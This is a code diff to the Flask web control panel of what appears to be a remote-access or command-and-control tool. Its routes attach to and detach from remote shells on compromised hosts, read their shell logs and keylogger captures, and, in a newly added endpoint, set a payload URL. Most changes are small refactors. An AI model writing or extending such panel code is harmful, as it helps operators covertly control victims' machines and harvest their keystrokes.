@@ -25,10 +25,10 @@ def login(error):
         if app.post_login():
             return redirect(url_for('dashboard'))
         return redirect(url_for('login', error=1))
-    
+
     if error:
         error = errors[error - 1]
-    
+
     return render_template('login.html', error=error)
 
 @app.route('/logout', methods=['GET'])
@@ -37,7 +37,7 @@ def logout():
     if app.auth():
         app.logout()
         error = 2
-    
+
     return redirect(url_for('login', error=error))
 
 @app.route('/')
@@ -73,7 +73,7 @@ def push_msg(json):
                     websocket.emit('msg-received', json)
                     json['timestamp'] = Utils.timestamp()
                     app.send_msg(json)
-                    
+
                     Log.log_chat(json['timestamp'], json['username'], json['message'])
         except:
             pass
@@ -117,9 +117,8 @@ def list_shells():
 @app.route('/api/attachShell/<uid>/<id>', methods=['GET', 'POST'])
 def attach_shell(uid, id):
     if app.auth():
-        app.hook_shell(uid, id)
-        return render_template("shell-box.html", id=id, username=app.get_username(), uid=app.get_session_uid(),
-                                domain=app.get_shell_domain(id), hostname=app.get_shell_hostname(id), user=app.get_shell_user(id))
+        app.hook_shell(id)
+        return ""
     else:
         return redirect(url_for('login'))
 
@@ -127,7 +126,7 @@ def attach_shell(uid, id):
 @app.route('/api/detachShell/<uid>/<id>', methods=['GET', 'POST'])
 def detach_shell(uid, id):
     if app.auth():
-        app.unhook_shell(uid, id)
+        app.unhook_shell(id)
         return ""
     else:
         return redirect(url_for('login'))
@@ -166,11 +165,12 @@ def fetch_output(id):
 def fetch_input(id):
     if app.auth():
         data = app.get_input(id)
-        if len(data) == 0:
-            return '__no_output__'
-        else:
-            output = '<b>[%s] %s</b>\n' % (Utils.timestamp(),app.html_escape(data))
-            return output
+        if data is not None:
+            if len(data) == 0:
+                return '__no_output__'
+            else:
+                output = '<b>[%s] %s</b>\n' % (Utils.timestamp(),app.html_escape(data))
+                return output
     else:
         return redirect(url_for('login'))
 
@@ -178,7 +178,7 @@ def fetch_input(id):
 @app.route('/api/fetchKeylogger/<id>', methods=['GET', 'POST'])
 def fetch_keylogger(id):
     if app.auth():
-        return app.get_keylogger_data(id)
+        return app.get_keylogger(id)
     else:
         return redirect(url_for('login'))
 
@@ -186,7 +186,7 @@ def fetch_keylogger(id):
 @app.route('/api/fetchShellLog/<id>', methods=['GET', 'POST'])
 def fetch_shell_log(id):
     if app.auth():
-        return app.get_shell_data(id)
+        return app.get_shell(id)
     else:
         return redirect(url_for('login'))
 
@@ -203,6 +203,14 @@ def remove_shell(id):
     else:
         return redirect(url_for('login'))
 
+@app.route('/api/setPayloadInfo', methods=['POST'])
+def set_payload_info():
+    if app.auth():
+        data = request.json
+        url = data['payloadInfo']
+        app.set_payload(url)
+        return "payload-set"
+
 def init_gui_thread(config, cli):
     thread = threading.Thread(target=start_gui, args=(config, cli, ))
     thread.start()
@@ -210,25 +218,25 @@ def init_gui_thread(config, cli):
 
 def start_gui(config, cli):
     prefix = "http://"
-    
+
     try:
-        port =  int(config.get("gui-port"))   
+        port =  int(config.get("gui-port"))
     except:
         UI.error("(gui-port) GUI HTTP port need to be a integer.", True)
-    
+
     if config.get("https-enabled") == "on":
             prefix = "https://"
-            
+
     UI.warn('Web GUI Started: %s%s:%s' % (prefix, config.get('gui-host'), config.get('gui-port')))
-    UI.warn('Web GUI Password: %s\n\n' % config.get('server-password'))
-            
+    UI.warn('Web GUI Password: %s' % config.get('server-password'))
+
     app.init(config, cli)
     path = "%s/logs/%s" % (os.getcwd(), str(time.strftime("%d-%m-%Y")))
     gui_log = "%s/gui.log" % path
-    
+
     if not os.path.exists(path):
         os.makedirs(path)
-        
+
     fd = os.open(gui_log, os.O_RDWR | os.O_CREAT)
     stderr = 2
     websocket.run(app, host=config.get("gui-host"), port=port, log_output=os.dup2(fd, stderr))
